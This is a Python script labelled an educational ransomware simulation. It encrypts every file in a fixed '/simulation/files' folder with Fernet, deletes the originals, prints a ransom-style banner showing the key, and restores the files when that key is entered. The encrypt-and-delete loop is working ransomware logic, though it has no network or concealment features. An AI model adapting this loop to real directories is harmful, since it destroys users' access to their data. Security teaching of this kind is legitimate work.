import os
from cryptography.fernet import Fernet

FILES_DIR = "/simulation/files"
KEY_FILE  = "/simulation/secret.key"

def generate_key():
    key = Fernet.generate_key()
    with open(KEY_FILE, "wb") as f:
        f.write(key)
    return key

def encrypt_files(key):
    fernet = Fernet(key)
    encrypted_count = 0

    for filename in os.listdir(FILES_DIR):
        filepath = os.path.join(FILES_DIR, filename)

        if os.path.isfile(filepath) and not filename.endswith(".enc"):
            with open(filepath, "rb") as f:
                data = f.read()

            encrypted_data = fernet.encrypt(data)

            enc_path = filepath + ".enc"
            with open(enc_path, "wb") as f:
                f.write(encrypted_data)

            os.remove(filepath)
            encrypted_count += 1
            print(f"  [ENCRYPTED] {filename} → {filename}.enc")

    return encrypted_count

def decrypt_files(provided_key):
    try:
        fernet = Fernet(provided_key.encode())
    except Exception:
        print("\n  ❌ Invalid key format.")
        return False

    if not os.path.exists(KEY_FILE):
        print("\n  ❌ Key file not found.")
        return False

    with open(KEY_FILE, "rb") as f:
        real_key = f.read()

    if provided_key.encode() != real_key:
        print("\n  ❌ Wrong key! Files remain encrypted.")
        return False

    for filename in os.listdir(FILES_DIR):
        if filename.endswith(".enc"):
            filepath = os.path.join(FILES_DIR, filename)

            with open(filepath, "rb") as f:
                data = f.read()

            decrypted = fernet.decrypt(data)
            original_path = filepath[:-4]

            with open(original_path, "wb") as f:
                f.write(decrypted)

            os.remove(filepath)
            print(f"  [RESTORED] {filename} → {filename[:-4]}")

    return True

def show_ransom_note(key):
    print("\n" + "="*60)
    print("        ⚠️   YOUR FILES HAVE BEEN ENCRYPTED   ⚠️")
    print("="*60)
    print(f"\n  Decryption Key: {key.decode()}\n")
    print("  [!] SAFE EDUCATIONAL SIMULATION ONLY")
    print("="*60 + "\n")

def main():
    while True:
        print("\n" + "="*60)
        print("      RANSOMWARE SIMULATION - EDUCATIONAL DEMO")
        print("="*60)
        print("\n  [1] Encrypt Files (Simulate Attack)")
        print("  [2] Decrypt Files (Enter Key)")
        print("  [3] Exit\n")

        choice = input("  Enter choice: ").strip()

        if choice == "1":
            key = generate_key()
            count = encrypt_files(key)
            print(f"\n  [✓] {count} file(s) encrypted.")
            show_ransom_note(key)

        elif choice == "2":
            user_key = input("\n  Paste decryption key: ").strip()
            success = decrypt_files(user_key)
            if success:
                print("\n  ✅ Files restored successfully!")

        elif choice == "3":
            print("\n  Exiting.\n")
            break

        else:
            print("\n  ❌ Invalid choice.")

if __name__ == "__main__":
    main()
